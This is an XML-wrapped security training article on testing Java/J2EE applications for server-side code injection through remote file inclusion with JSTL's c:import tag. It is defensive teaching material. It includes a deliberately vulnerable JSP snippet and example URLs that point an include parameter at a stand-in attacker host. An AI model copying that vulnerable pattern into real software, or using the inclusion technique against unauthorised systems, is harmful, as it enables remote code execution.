<?xml version="1.0"?>
<TeamMentor_Article Metadata_Hash="1977022745" Content_Hash="-641646251">
  <Metadata>
    <Id>39a7c392-06eb-4ba4-9c81-1be0c20e3693</Id>
    <Id_History>fd3ecaaa-cb7c-43a2-a91a-f19862f736d4,</Id_History>
    <Library_Id>be5273b1-d682-4361-99d9-6234f2d47eb7</Library_Id>
    <Title>How to Test for Server-Side Code Injection in Java</Title>
    <Category>Testing</Category>
    <Phase>Test</Phase>
    <Technology>Java</Technology>
    <Type>How To</Type>
    <DirectLink>How to Test for Server-Side Code Injection in Java</DirectLink>
    <Tag />
    <Security_Demand />
    <Author />
    <Priority />
    <Status />
    <Source>SI</Source>
  </Metadata>
  <Content Sanitized="true" DataType="Html">
    <Data><![CDATA[<h1>Applies to</h1>
  <ul>
    <li>J2EE applications<b></b></li>
  </ul>
  <p>
    <b>
    </b>
  </p>
  <h1>Summary</h1>
  <p>J2EE applications are hosted by a Web server capable of interpreting and executing server-side code such as Java Server Pages (JSP files) or Java servlets. A server-side code injection bug occurs when an attacker is able to inject additional server-side code that is then interpreted and executed as part of the application&amp;#8217;s code; for instance, when an attacker remotely includes a malicious JSP page in a J2EE application. Since the server-side code is executed as part of the application, it has programmatic access to different application resources including user accounts and databases. Attackers can exploit server-side code injection bugs to execute logical attacks on J2EE applications.</p>
  <p>Follow these steps to test for server-side code injection in J2EE applications:</p>
  <ul>
    <li>Step 1: Understand attack scenarios <li>Step 2: Analyze causes and countermeasures <li>Step 3: Execute test cases</li></li></li>
  </ul>
  <h1>Step 1: Understand attack scenarios</h1>
  <p>The first step in learning how to test for server-side code injection bugs is to understand the anatomy of a server-side code injection vulnerability in J2EE.</p>
  <p>It is important to understand the difference between client-side code injection and server-side code injection:</p>
  <p>Client-side code injection occurs when an attacker uses a vulnerable web application to execute remote code in the client&amp;#8217;s browser context.&amp;nbsp;This is why client-side code injection&amp;nbsp;attacks such as cross-site scripting (XSS) as well as AJAX injection attacks are written in JavaScript; the victim client&amp;#8217;s browser must be able to interpret the exploit code.</p>
  <p>Server-side code injection aims at having the application&amp;#8217;s web engine (such as ASP, JSP, etc.) interpret and execute the malicious code as part of the application. This means that an attacker&amp;nbsp;who successfully exploits a server-side code injection bug will add an extra application functionality that executes with the same privileges of the application&amp;#8217;s code.&amp;nbsp;&amp;nbsp; </p>
  <p>J2EE web applications that remotely include source code files, such as JSP pages containing server-side scripts, might be vulnerable to this attack which is also known as Remote File Inclusion (RFI) attack. Consider an application that uses a URL parameter to include a remote file from a trusted site:</p>
  <pre>http://some_site/example.jsp?includeFile=<strong>http://trusted_site/remote.jsp</strong></pre>
  <p>A vulnerable J2EE application allows an attacker to tamper with the URL parameter in order to remotely include a malicious source code file:<i></i></p>
  <pre>http://some_site/example.jsp?includeFile=http://attacker_site/attack.jsp</pre>
  <p>In detail:</p>
  <ol>
    <li>The attacker discovers an application functionality where client supplied input is used as a filename of a remote file inclusion. <li>The attacker passes the name of a remote file, hosted at an attacker-controlled site, and containing malicious code.</li></li>
  </ol>
  <h1>Step 2: Analyze Causes and Countermeasures</h1>
  <p>The&amp;nbsp;second step in learning how to test for server-side code injection bugs is to understand what causes this attack and how to protect against it.&amp;nbsp; </p>
  <p>Server-side code injection in J2EE applications is possible due to improper Remote File Inclusion (RFI).&amp;nbsp; Even though server-side code injection and Remote File Inclusion (RFI) vulnerabilities are commonly associated with PHP applications, J2EE applications might be also vulnerable to this attack. RFI vulnerabilities are caused because the application&amp;#8217;s code fails to properly sanitize and validate client-supplied input and uses it in a remote file inclusion.&amp;nbsp; </p>
  <p>Note that J2EE applications that use the <em>&lt;include&gt;</em> or <em>&lt;jsp:include&gt;</em> tags only allow for relative paths so including a remote file is impossible, making them safe against this variation. However, J2EE applications can use the Java Standard Tag Library&amp;#8217;s (JSTL) <em>&lt;c:import&gt;</em> tag to include a remote source code file.&amp;nbsp;Consider this code:</p>
  <pre>&lt;&amp;#37;&amp;#64; taglib prefix="c" uri="http://java.sun.com/jstl/core" &amp;#37;&gt; <br />&lt;c:catch var="ex"&gt;<br />&amp;nbsp;&amp;nbsp;<strong>&lt;c:import url="</strong><strong> &lt;&amp;#37;= request.getParameter(\"sourceFile\") &amp;#37;&gt;"/&gt;</strong></pre>
  <pre>&lt;/c:catch&gt;<br />&lt;c:if test="&amp;#36;&amp;#123;not empty ex&amp;#125;" &gt;<br />&amp;nbsp;&amp;nbsp;Error: &lt;c:out value="message" /&gt;<br />&lt;/c:if&gt;</pre>
  <p>The code above includes a remote file specified by the <em>sourceFile</em> URL parameter, but it directly uses the input in the <em>&lt;c:import&gt; </em>tag without proper input validation. As a result, an attacker can inject malicious server-side code to the application through the <em>sourceFile</em> URL parameter:</p>
  <pre>http://some_site/example.jsp?<strong>sourceFile</strong>=http://attacker_site/attack.jsp</pre>
  <p>Depending on the platform in use, it may be possible to use additional RFI methods to the JSTL example above. </p>
  <p>To protect against this bug, J2EE applications should hide their remote file includes from being accessed by outside clients.&amp;nbsp;If they must use accessible input during remote includes (i.e. URL parameters), they must be sure to properly validate any parameters before during remote file inclusion.&amp;nbsp;Developers are recommended to create a whitelist<em></em>containing a list of the valid remote locations (that can be also implemented as a regular expression). The application must then check that all parameters used in the inclusion appear in the white list and reject any input parameter that is not white-listed.</p>
  <h1>Step 3: Execute Test Cases</h1>
  <p>Now that you&amp;#8217;ve reviewed the theoretical aspects of server-side code injection bugs in J2EE it is necessary to execute the necessary test cases to check if your application is vulnerable.</p>
  <h2>
    <em>Test for Server-side code injection in J2EE</em>
  </h2>
  <p>Follow these steps:</p>
  <ol>
    <li>Create a proof-of-concept JSP file <i>test.jsp</i>&amp;nbsp; with the following code: <pre>&lt;jsp:text&gt;Application is vulnerable&lt;/jsp:text&gt;</pre><li>Host the JSP file above in a test site domain: <pre>http://test_site/test.jsp</pre><li>Discover a functionality in the application that performs remote file inclusion based on client supplied input. <li>Pass the URL from Step 2 as client input. <li>Observe how the application reacts to the injected code.</li></li></li></li></li>
  </ol>
  <p>Expected results: The application is vulnerable if it includes and executes the JSP page and displays the message <i>Application is vulnerable.</i></p>
  <p>
    <b>
    </b>
  </p>
  <h1>Conclusions</h1>
  <p>Server-side code injection bugs allow attackers to inject code that will be executed by the J2EE engine that hosts the vulnerable application. Attackers can use server-side code injection to execute logical attacks on the target application.&amp;nbsp;To learn how to test for this vulnerability, it is necessary to understand its attack scenario and how it is possible in J2EE applications, as well as how to protect against it. Testing for this bug requires building a small proof-of-concept page, hosting it in a remote location, and passing a URL to the page as input to the application under test while observing how the application reacts.</p>
  <h1>Input and Data Validation Guidelines</h1>
  <ul>
    <li>
      <a href="/article/b531d29c-86f7-4812-90ce-5f3f0f780aba">Validate Input from All Sources</a>
    </li>
    <li>
      <a href="/article/c98695c5-cf02-44a1-96bf-1f8046b8ad9d">Validate Input for Length, Range, Format, and Type</a>
    </li>
    <li>
      <a href="/article/67060e7b-7145-4e84-b574-c07548f81d9f">
        <a href="/article/67060e7b-7145-4e84-b574-c07548f81d9f">Validate All Input Passed to the Database</a>
      </a>
    </li>
    <li>
      <a href="/article/a5491c44-164b-4046-94d3-b575b9745e8b">Filter All User-Supplied Filename and Path Input</a>
    </li>
    <li>
      <a href="/article/9f21442f-2aee-4573-8be6-a5b51d9c89b8">Do Not Rely on Client-Side Validation</a>
    </li>
  </ul>
  <h1>Input and Data Validation Checklists</h1>
  <ul>
    <li>
      <a href="/article/7f8deb21-cd52-41be-80b4-8897612021dc">Input from All Sources Is Validated</a>
    </li>
    <li>
      <a href="/article/61869793-2c10-40c0-b82a-babcc0312697">Input Is Validated for Length, Range, Format and Type</a>
    </li>
    <li>
      <a href="/article/42f4b565-14f7-42f4-8c5a-0f78f357e4c0">All Database Input Is Validated</a>
    </li>
    <li>
      <a href="/article/17884af0-fc83-412a-b613-4def4a6f84ad">User-Supplied Filenames and Paths Are Validated</a>
    </li>
    <li>
      <a href="/article/b1803c35-9579-4a38-9a63-30202160ef25">The Application Does Not Rely on Client-Side Validation</a>
    </li>
  </ul>
  <h1>Input and Data Validation Code Examples</h1>
  <ul>
    <li>
      <a href="/article/0f49430b-2abe-408f-b046-89fa739f5d53">Input Validation Using JSF</a>
    </li>
    <li>
      <a href="/article/18ac74df-602b-4a58-8998-52f638f3a045">Input Validation Using SpringMVC</a>
    </li>
    <li>
      <a href="/article/d124abb1-e230-43ef-8762-1caa0dbb89ca">Input Validation Using Struts 1</a>
    </li>
    <li>
      <a href="/article/2f917654-65a8-49c9-b000-c17f9765bf42">Input Validation Using Struts 2</a>
    </li>
    <li>
      <a href="/article/38342130-4e4b-47df-afd9-c7e8c86f77ee">Use ESAPI Executor</a>
    </li>
  </ul>
  <h1>Input and Data Validation Testing</h1>
  <ul>
    <li>
      <a href="/article/fd3ecaaa-cb7c-43a2-a91a-f19862f736d4">How to Test for Server-Side Code Injection in Java</a>
    </li>
    <li>
      <a href="/article/c00b9149-1290-4c9e-bcd0-392a9c5a6fb0">How to Test for Path Manipulation Bugs in Java</a>
    </li>
    <li>
      <a href="/article/5c99da7b-b4eb-4315-b48c-ac2598c13144">How to Test for Double Encoding Bugs in Java</a>
    </li>
    <li>
      <a href="/article/fc95c5e5-667a-4e66-b1cf-f7d0529c4c2f">How to Test for Client-side Validation Bypass Bugs in Java</a>
    </li>
    <li>
      <a href="/article/6f4e927b-bd45-498b-95c4-78fd2c3287c1">How to Test for Integer Overflows in Java</a>
    </li>
    <li>
      <a href="/article/ed20009a-59ef-415d-8e72-0ff3221a1346">How to Test for Integer Underflow Bugs in Java</a>
    </li>
    <li>
      <a href="/article/d7682043-0095-4700-97dd-01ce797c4ada">How to Test for Deserialization of Untrusted Data Bugs in Java</a>
    </li>
  </ul>]]></Data>
  </Content>
</TeamMentor_Article>